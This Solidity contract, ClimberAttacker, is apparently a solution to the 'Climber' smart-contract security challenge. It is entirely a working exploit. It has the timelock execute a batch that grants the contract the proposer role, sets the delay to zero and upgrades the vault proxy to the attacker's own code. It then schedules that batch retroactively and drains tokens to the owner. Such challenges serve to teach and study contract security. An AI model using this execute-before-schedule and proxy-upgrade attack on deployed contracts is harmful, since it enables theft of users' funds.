// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ClimberAttacker {
    ClimberTimelock private timelock;
    address private vault;
    address private immutable owner;

    constructor(address _timelock, address _vault) {
        timelock = ClimberTimelock(payable(_timelock));
        vault = _vault;
        owner = msg.sender;
    }

    function buildProposal()
        internal
        view
        returns (address[] memory, uint256[] memory, bytes[] memory)
    {
        address[] memory targets = new address[](4);
        // add this to proposer
        targets[0] = address(timelock);
        //update the waiting time
        targets[1] = address(timelock);
        // udpate the implementation
        targets[2] = vault;
        // schedule this operation
        targets[3] = address(this);

        uint256[] memory values = new uint256[](4);

        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        bytes[] memory dataElements = new bytes[](4);

        // add self to proposer role
        bytes32 PROPOSER_ROLE = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1;
        dataElements[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(this)
        );

        dataElements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        dataElements[2] = abi.encodeWithSignature(
            "upgradeTo(address)",
            address(this)
        );

        // schedule this operation
        dataElements[3] = abi.encodeWithSignature("scheduleProposal()");

        return (targets, values, dataElements);
    }

    function attack(address token, uint amount) public {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = buildProposal();
        timelock.execute(targets, values, dataElements, 0);

        (bool s, ) = vault.call(
            abi.encodeWithSignature("withdraw(address,uint256)", token, amount)
        );
        require(s, "Transfer from proxy failed");
    }

    function scheduleProposal() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = buildProposal();
        timelock.schedule(targets, values, dataElements, 0);
    }

    function withdraw(address token, uint amount) public {
        IERC20(token).transfer(owner, amount);
    }

    function proxiableUUID() external view virtual returns (bytes32) {
        bytes32 _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        return _IMPLEMENTATION_SLOT;
    }
}
